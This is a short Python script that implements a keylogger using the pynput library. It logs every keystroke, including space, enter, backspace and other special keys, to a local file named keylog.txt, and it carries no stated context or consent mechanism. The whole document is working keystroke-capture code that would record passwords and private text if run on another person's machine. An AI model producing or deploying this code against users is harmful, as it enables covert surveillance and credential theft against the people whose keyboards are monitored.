from pynput.keyboard import Listener

def on_press(key):
    try:
        # Open file in append mode
        with open("keylog.txt", "a") as log_file:
            # Write key to file
            log_file.write(f"{key.char}")  # Logs regular characters
    except AttributeError:
        # Handle special keys (e.g., space, enter, backspace)
        with open("keylog.txt", "a") as log_file:
            if key == key.space:
                log_file.write(" ")
            elif key == key.enter:
                log_file.write("\n")
            elif key == key.backspace:
                log_file.write("<BACKSPACE>")
            else:
                log_file.write(f"<{key}>")  # Log other special keys like shift, ctrl

def main():
    # Start listening to keystrokes
    with Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    main()
